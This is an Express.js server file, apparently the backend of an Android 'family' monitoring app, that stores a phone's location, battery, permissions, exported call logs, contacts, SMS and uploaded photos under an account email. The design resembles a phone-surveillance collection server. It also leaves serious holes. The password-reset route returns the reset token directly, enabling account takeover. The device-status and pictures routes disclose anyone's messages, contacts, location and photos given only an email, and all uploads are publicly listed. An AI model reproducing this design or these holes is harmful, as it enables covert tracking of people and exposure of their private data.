const express = require("express");
const cors = require("cors");
const crypto = require("crypto");
const path = require("path");
const fs = require("fs");
const multer = require("multer");

const app = express();

app.use(cors());
app.use(express.json({ limit: "20mb" }));
app.use(express.urlencoded({
    extended: true,
    limit: "20mb"
}));

/* =========================
   FILE STORAGE
========================= */

const uploadDir = path.join(__dirname, "uploads");

if (!fs.existsSync(uploadDir)) {
    fs.mkdirSync(uploadDir, { recursive: true });
}

app.use(
    "/uploads",
    express.static(uploadDir)
);

const storage = multer.diskStorage({

    destination: (req, file, cb) => {
        cb(null, uploadDir);
    },

    filename: (req, file, cb) => {

        const safeName =
            Date.now() +
            "-" +
            file.originalname
                .replace(/[^a-zA-Z0-9._-]/g, "_");

        cb(null, safeName);
    }
});

const upload = multer({
    storage: storage,
    limits: {
        fileSize: 20 * 1024 * 1024
    }
});

/* =========================
   USER DATABASE - TEST
========================= */

const USERS_FILE =
    path.join(__dirname, "users.json");

let users = [];

if (fs.existsSync(USERS_FILE)) {

    try {

        users =
            JSON.parse(
                fs.readFileSync(
                    USERS_FILE,
                    "utf8"
                )
            );

    } catch (e) {

        users = [];
    }
}

function saveUsers() {

    fs.writeFileSync(
        USERS_FILE,
        JSON.stringify(
            users,
            null,
            2
        )
    );
}

/* =========================
   DEVICE DATA
========================= */

const deviceData = {};

function getDevice(email) {

    if (!deviceData[email]) {

        deviceData[email] = {

            battery: "N/A",

            location: "N/A",

            deviceModel: "Android Device",

            status: "Offline",

            lastUpdate: null,

            permissions: {

                camera: false,
                mic: false,
                contacts: false,
                phone: false,
                calls: false,
                sms: false
            },

            exportedData: {

                calls: [],
                contacts: [],
                sms: []
            },

            pictures: []
        };
    }

    return deviceData[email];
}

/* =========================
   PASSWORD HASH
========================= */

function hashPassword(password) {

    const salt =
        crypto.randomBytes(16).toString("hex");

    const hash =
        crypto.scryptSync(
            password,
            salt,
            64
        ).toString("hex");

    return salt + ":" + hash;
}

function verifyPassword(
    password,
    stored
) {

    try {

        if (!stored.includes(":")) {

            return password === stored;
        }

        const parts =
            stored.split(":");

        const salt = parts[0];
        const original = parts[1];

        const hash =
            crypto.scryptSync(
                password,
                salt,
                64
            ).toString("hex");

        return crypto.timingSafeEqual(
            Buffer.from(hash, "hex"),
            Buffer.from(original, "hex")
        );

    } catch (e) {

        return false;
    }
}

/* =========================
   REGISTER
========================= */

app.post(
    "/api/register",
    (req, res) => {

        const name =
            String(req.body.name || "")
                .trim();

        const email =
            String(req.body.email || "")
                .trim()
                .toLowerCase();

        const password =
            String(req.body.password || "");

        if (!name ||
            !email ||
            password.length < 6) {

            return res.status(400).json({

                success: false,

                message:
                    "Name, valid email aur minimum 6 character password required."
            });
        }

        const existing =
            users.find(
                u =>
                    String(u.email)
                        .toLowerCase() === email
            );

        if (existing) {

            return res.status(400).json({

                success: false,

                message:
                    "Email pehle se registered hai!"
            });
        }

        users.push({

            name: name,

            email: email,

            password:
                hashPassword(password),

            resetToken: null,

            resetExpires: null,

            createdAt:
                new Date().toISOString()
        });

        saveUsers();

        res.json({

            success: true,

            message:
                "Account registered successfully!"
        });
    }
);

/* =========================
   LOGIN
========================= */

app.post(
    "/api/login",
    (req, res) => {

        const email =
            String(req.body.email || "")
                .trim()
                .toLowerCase();

        const password =
            String(req.body.password || "");

        const user =
            users.find(
                u =>
                    String(u.email)
                        .toLowerCase() === email
            );

        if (!user ||
            !verifyPassword(
                password,
                user.password
            )) {

            return res.status(401).json({

                success: false,

                message:
                    "Galat Email ya Password!"
            });
        }

        /*
         * Old plaintext accounts:
         * successful login ke baad
         * automatically hash ho jayenge.
         */

        if (!String(user.password).includes(":")) {

            user.password =
                hashPassword(password);

            saveUsers();
        }

        res.json({

            success: true,

            name: user.name,

            email: user.email
        });
    }
);

/* =========================
   PASSWORD RESET TOKEN
========================= */

app.post(
    "/api/forgot-password",
    (req, res) => {

        const email =
            String(req.body.email || "")
                .trim()
                .toLowerCase();

        const user =
            users.find(
                u =>
                    String(u.email)
                        .toLowerCase() === email
            );

        if (!user) {

            return res.status(404).json({

                success: false,

                message:
                    "Email registered nahi hai!"
            });
        }

        const token =
            crypto.randomBytes(32)
                .toString("hex");

        user.resetToken = token;

        user.resetExpires =
            Date.now() + 3600000;

        saveUsers();

        /*
         * Test version:
         * reset token response mein diya ja raha hai.
         * Production mein email service connect karenge.
         */

        res.json({

            success: true,

            message:
                "Reset token generated.",

            resetToken: token
        });
    }
);

/* =========================
   RESET PASSWORD
========================= */

app.post(
    "/api/reset-password",
    (req, res) => {

        const token =
            String(req.body.token || "");

        const newPassword =
            String(req.body.newPassword || "");

        if (newPassword.length < 6) {

            return res.status(400).json({

                success: false,

                message:
                    "Password minimum 6 characters ka hona chahiye."
            });
        }

        const user =
            users.find(
                u =>
                    u.resetToken === token &&
                    u.resetExpires > Date.now()
            );

        if (!user) {

            return res.status(400).json({

                success: false,

                message:
                    "Invalid ya expired token!"
            });
        }

        user.password =
            hashPassword(newPassword);

        user.resetToken = null;

        user.resetExpires = null;

        saveUsers();

        res.json({

            success: true,

            message:
                "Password update ho gaya!"
        });
    }
);

/* =========================
   DEVICE STATUS UPDATE
========================= */

app.post(
    "/api/update-status",
    (req, res) => {

        const email =
            String(req.body.email || "")
                .trim()
                .toLowerCase();

        if (!email) {

            return res.status(400).json({

                success: false,

                message:
                    "Account email required."
            });
        }

        const user =
            users.find(
                u =>
                    String(u.email)
                        .toLowerCase() === email
            );

        if (!user) {

            return res.status(401).json({

                success: false,

                message:
                    "Account not found."
            });
        }

        const d =
            getDevice(email);

        if (req.body.battery !== undefined)
            d.battery =
                req.body.battery;

        if (req.body.location !== undefined)
            d.location =
                req.body.location;

        if (req.body.deviceModel !== undefined)
            d.deviceModel =
                req.body.deviceModel;

        if (req.body.status !== undefined)
            d.status =
                req.body.status;

        if (req.body.permissions) {

            d.permissions =
                Object.assign(
                    d.permissions,
                    req.body.permissions
                );
        }

        d.lastUpdate =
            new Date().toISOString();

        res.json({
            success: true
        });
    }
);

/* =========================
   DEVICE STATUS
========================= */

app.get(
    "/api/device-status",
    (req, res) => {

        const email =
            String(req.query.email || "")
                .trim()
                .toLowerCase();

        if (!email) {

            return res.status(400).json({

                success: false,

                message:
                    "Email required."
            });
        }

        const d =
            getDevice(email);

        res.json({

            success: true,

            ...d
        });
    }
);

/* =========================
   USER INITIATED DATA EXPORT
========================= */

app.post(
    "/api/export-data",
    (req, res) => {

        const email =
            String(req.body.email || "")
                .trim()
                .toLowerCase();

        const type =
            String(req.body.type || "");

        const data =
            req.body.data;

        if (!email ||
            !["calls", "contacts", "sms"]
                .includes(type)) {

            return res.status(400).json({

                success: false,

                message:
                    "Invalid export request."
            });
        }

        const user =
            users.find(
                u =>
                    String(u.email)
                        .toLowerCase() === email
            );

        if (!user) {

            return res.status(401).json({

                success: false,

                message:
                    "Account not found."
            });
        }

        const d =
            getDevice(email);

        d.exportedData[type] =
            Array.isArray(data)
                ? data
                : [];

        d.lastUpdate =
            new Date().toISOString();

        res.json({

            success: true,

            message:
                type +
                " data saved successfully."
        });
    }
);

/* =========================
   UPLOAD MEDIA
========================= */

app.post(
    "/api/upload-picture",
    upload.single("image"),
    (req, res) => {

        const email =
            String(
                req.body.email || ""
            )
            .trim()
            .toLowerCase();

        if (!req.file) {

            return res.status(400).json({

                success: false,

                message:
                    "No file selected."
            });
        }

        const fileUrl =
            "https://wifi-family-backend.onrender.com/uploads/" +
            encodeURIComponent(
                req.file.filename
            );

        if (email) {

            const d =
                getDevice(email);

            d.pictures.push({

                filename:
                    req.file.filename,

                url: fileUrl,

                uploadedAt:
                    new Date().toISOString()
            });
        }

        res.json({

            success: true,

            url: fileUrl,

            filename:
                req.file.filename
        });
    }
);

/* =========================
   PICTURES
========================= */

app.get(
    "/api/pictures",
    (req, res) => {

        const email =
            String(req.query.email || "")
                .trim()
                .toLowerCase();

        if (email) {

            const d =
                getDevice(email);

            return res.json({

                success: true,

                pictures:
                    d.pictures
            });
        }

        res.json({

            success: true,

            pictures: []
        });
    }
);

/* =========================
   FILE LIST
========================= */

app.get(
    "/api/files",
    (req, res) => {

        fs.readdir(
            uploadDir,
            (err, files) => {

                if (err) {

                    return res.json({

                        success: false,

                        files: []
                    });
                }

                const list =
                    files.map(
                        filename => ({

                            filename,

                            url:
                                "https://wifi-family-backend.onrender.com/uploads/" +
                                encodeURIComponent(
                                    filename
                                )
                        })
                    );

                res.json({

                    success: true,

                    files: list
                });
            }
        );
    }
);

/* =========================
   HEALTH
========================= */

app.get(
    "/api/health",
    (req, res) => {

        res.json({

            success: true,

            message:
                "Backend is running",

            time:
                new Date().toISOString()
        });
    }
);

/* =========================
   START SERVER
========================= */

const PORT =
    process.env.PORT || 10000;

app.listen(
    PORT,
    () => {

        console.log(
            "Server running on port " +
            PORT
        );
    }
);
